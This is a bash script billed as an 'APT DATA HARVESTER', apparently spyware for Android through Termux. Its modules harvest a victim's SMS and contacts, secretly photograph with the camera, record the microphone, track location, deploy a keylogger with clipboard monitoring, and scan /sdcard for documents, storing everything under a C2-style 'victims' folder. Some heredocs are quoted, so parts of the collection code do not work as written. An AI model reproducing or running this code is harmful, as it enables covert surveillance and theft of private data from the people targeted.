#!/bin/bash
# ============================================
# APT DATA HARVESTER v1.0
# 7 Collection Modules | Auto-Exfil
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

VICTIM_DIR="$HOME/c2_server/victims"
LOG_DIR="$HOME/c2_server/logs"
COLLECT_DIR="$HOME/c2_server/modules/data_collect"

mkdir -p "$VICTIM_DIR" "$LOG_DIR" "$COLLECT_DIR"

# === MODULE 1: SMS HARVESTER ===
sms_harvester() {
    local victim_id="$1"
    local output_dir="$VICTIM_DIR/$victim_id/data"
    mkdir -p "$output_dir"
    
    echo -e "${GREEN}[+]${NC} Harvesting SMS for $victim_id..."
    
    cat > "$output_dir/sms_dump.txt" << 'SMS'
[SMS INBOX DUMP]
==================
Date: $(date)
Victim: VICTIM_ID_PLACEHOLDER

--- SMS List ---
$(termux-sms-list 2>/dev/null || echo "SMS access requires Termux:API")

--- End of Dump ---
SMS
    
    sed -i "s/VICTIM_ID_PLACEHOLDER/$victim_id/" "$output_dir/sms_dump.txt"
    
    local count=$(grep -c "From:" "$output_dir/sms_dump.txt" 2>/dev/null || echo 0)
    echo -e "  📱 SMS: $count messages extracted"
    echo "[$(date)] SMS_HARVEST | $victim_id | $count messages" >> "$LOG_DIR/data_collection.log"
}

# === MODULE 2: CONTACTS HARVESTER ===
contacts_harvester() {
    local victim_id="$1"
    local output_dir="$VICTIM_DIR/$victim_id/data"
    mkdir -p "$output_dir"
    
    echo -e "${GREEN}[+]${NC} Harvesting Contacts for $victim_id..."
    
    cat > "$output_dir/contacts_dump.txt" << 'CONTACTS'
[CONTACTS DUMP]
==================
Date: $(date)
Victim: VICTIM_ID_PLACEHOLDER

--- Contact List ---
$(termux-contact-list 2>/dev/null || echo "Contact access requires Termux:API")

--- End of Dump ---
CONTACTS
    
    sed -i "s/VICTIM_ID_PLACEHOLDER/$victim_id/" "$output_dir/contacts_dump.txt"
    
    local count=$(grep -c "name" "$output_dir/contacts_dump.txt" 2>/dev/null || echo 0)
    echo -e "  👥 Contacts: $count entries extracted"
    echo "[$(date)] CONTACTS_HARVEST | $victim_id | $count contacts" >> "$LOG_DIR/data_collection.log"
}

# === MODULE 3: CAMERA CAPTURE ===
camera_capture() {
    local victim_id="$1"
    local output_dir="$VICTIM_DIR/$victim_id/screenshots"
    mkdir -p "$output_dir"
    
    echo -e "${GREEN}[+]${NC} Capturing camera for $victim_id..."
    
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local photo_file="$output_dir/photo_$timestamp.jpg"
    
    termux-camera-photo -c 0 "$photo_file" 2>/dev/null
    
    if [ -f "$photo_file" ]; then
        echo -e "  📸 Photo captured: $photo_file"
        echo "[$(date)] CAMERA_CAPTURE | $victim_id | Photo saved" >> "$LOG_DIR/data_collection.log"
    else
        echo -e "  ${RED}[!]${NC} Camera capture failed (permissions?)"
    fi
}

# === MODULE 4: MICROPHONE RECORDING ===
mic_recorder() {
    local victim_id="$1"
    local duration="${2:-30}"  # Default 30 seconds
    local output_dir="$VICTIM_DIR/$victim_id/data"
    mkdir -p "$output_dir"
    
    echo -e "${GREEN}[+]${NC} Recording microphone for $victim_id (${duration}s)..."
    
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local audio_file="$output_dir/recording_$timestamp.mp3"
    
    termux-microphone-record -f "$audio_file" -l "$duration" 2>/dev/null
    
    if [ -f "$audio_file" ]; then
        echo -e "  🎙️ Audio recorded: $audio_file"
        echo "[$(date)] MIC_RECORD | $victim_id | ${duration}s audio" >> "$LOG_DIR/data_collection.log"
    else
        echo -e "  ${RED}[!]${NC} Microphone recording failed"
    fi
}

# === MODULE 5: LOCATION TRACKER ===
location_tracker() {
    local victim_id="$1"
    local output_dir="$VICTIM_DIR/$victim_id/data"
    mkdir -p "$output_dir"
    
    echo -e "${GREEN}[+]${NC} Getting location for $victim_id..."
    
    local location_data="$output_dir/location_log.txt"
    
    cat >> "$location_data" << LOC
[$(date)] Location Request
$(termux-location 2>/dev/null || echo "Location requires Termux:API")
---
LOC
    
    echo -e "  📍 Location logged: $location_data"
    echo "[$(date)] LOCATION_TRACK | $victim_id" >> "$LOG_DIR/data_collection.log"
}

# === MODULE 6: KEYLOGGER ===
keylogger_deploy() {
    local victim_id="$1"
    local output_dir="$VICTIM_DIR/$victim_id/keystrokes"
    mkdir -p "$output_dir"
    
    echo -e "${GREEN}[+]${NC} Deploying keylogger for $victim_id..."
    
    cat > "$output_dir/keylogger.sh" << 'KEYLOG'
#!/bin/bash
# APT Keylogger
LOG="$HOME/../keystrokes_$(date +%Y%m%d).log"

# Method 1: Input device capture
cat /dev/input/event* 2>/dev/null | while read line; do
    echo "[$(date +%H:%M:%S)] $line" >> "$LOG"
done &

# Method 2: Clipboard monitor
while true; do
    clip=$(termux-clipboard-get 2>/dev/null)
    [ -n "$clip" ] && [ "$clip" != "$prev" ] && {
        echo "[$(date +%H:%M:%S)] CLIPBOARD: $clip" >> "$LOG"
        prev="$clip"
    }
    sleep 3
done &
KEYLOG
    
    chmod +x "$output_dir/keylogger.sh"
    echo -e "  ⌨️ Keylogger deployed: $output_dir/keylogger.sh"
    echo "[$(date)] KEYLOGGER_DEPLOY | $victim_id" >> "$LOG_DIR/data_collection.log"
}

# === MODULE 7: FILE BROWSER ===
file_explorer() {
    local victim_id="$1"
    local target_path="${2:-/sdcard}"
    local output_dir="$VICTIM_DIR/$victim_id/exfiltrated"
    mkdir -p "$output_dir"
    
    echo -e "${GREEN}[+]${NC} Scanning files for $victim_id ($target_path)..."
    
    cat > "$output_dir/file_tree.txt" << TREE
[FILE SYSTEM SCAN]
====================
Date: $(date)
Path: $target_path
Victim: $victim_id

$(find "$target_path" -type f -name "*.pdf" -o -name "*.doc" -o -name "*.txt" -o -name "*.jpg" -o -name "*.png" 2>/dev/null | head -50)

--- End of Scan ---
TREE
    
    local file_count=$(grep -c "\." "$output_dir/file_tree.txt" 2>/dev/null || echo 0)
    echo -e "  📁 $file_count sensitive files found"
    echo "[$(date)] FILE_SCAN | $victim_id | $file_count files" >> "$LOG_DIR/data_collection.log"
}

# === BULK COLLECTION ===
harvest_all() {
    local victim_id="$1"
    
    echo -e "\n${CYAN}╔══════════════════════════════╗${NC}"
    echo -e "${CYAN}║  💀 BULK DATA HARVEST       ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════╝${NC}"
    echo -e "${YELLOW}Target: $victim_id${NC}\n"
    
    sms_harvester "$victim_id"
    contacts_harvester "$victim_id"
    camera_capture "$victim_id"
    mic_recorder "$victim_id" 15
    location_tracker "$victim_id"
    keylogger_deploy "$victim_id"
    file_explorer "$victim_id" "/sdcard"
    
    echo -e "\n${GREEN}[+]${NC} Full harvest complete for $victim_id!"
    echo -e "${CYAN}[*]${NC} Data saved in: $VICTIM_DIR/$victim_id/"
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║   📊 DATA HARVESTER v1.0   ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        
        # Show available victims
        echo -e "${YELLOW}[Available Victims]${NC}"
        ls -d "$VICTIM_DIR"/VICTIM-* 2>/dev/null | while read v; do
            echo "  📱 $(basename $v)"
        done
        echo ""
        
        echo -e "  ${GREEN}1)${NC} 📱 SMS Harvester"
        echo -e "  ${GREEN}2)${NC} 👥 Contacts Harvester"
        echo -e "  ${GREEN}3)${NC} 📸 Camera Capture"
        echo -e "  ${GREEN}4)${NC} 🎙️ Microphone Record"
        echo -e "  ${GREEN}5)${NC} 📍 Location Tracker"
        echo -e "  ${GREEN}6)${NC} ⌨️ Keylogger Deploy"
        echo -e "  ${GREEN}7)${NC} 📁 File Explorer"
        echo -e "  ${GREEN}8)${NC} 💀 HARVEST ALL"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        [ "$choice" = "0" ] && break
        
        echo -ne "${YELLOW}Victim ID (e.g., VICTIM-001): ${NC}"
        read -r victim_id
        
        [ ! -d "$VICTIM_DIR/$victim_id" ] && {
            echo -e "${RED}[!] Victim not found!${NC}"
            continue
        }
        
        case $choice in
            1) sms_harvester "$victim_id" ;;
            2) contacts_harvester "$victim_id" ;;
            3) camera_capture "$victim_id" ;;
            4) 
                echo -ne "${YELLOW}Duration (seconds, default 30): ${NC}"
                read -r duration
                mic_recorder "$victim_id" "${duration:-30}"
                ;;
            5) location_tracker "$victim_id" ;;
            6) keylogger_deploy "$victim_id" ;;
            7)
                echo -ne "${YELLOW}Path (default /sdcard): ${NC}"
                read -r target_path
                file_explorer "$victim_id" "${target_path:-/sdcard}"
                ;;
            8) harvest_all "$victim_id" ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
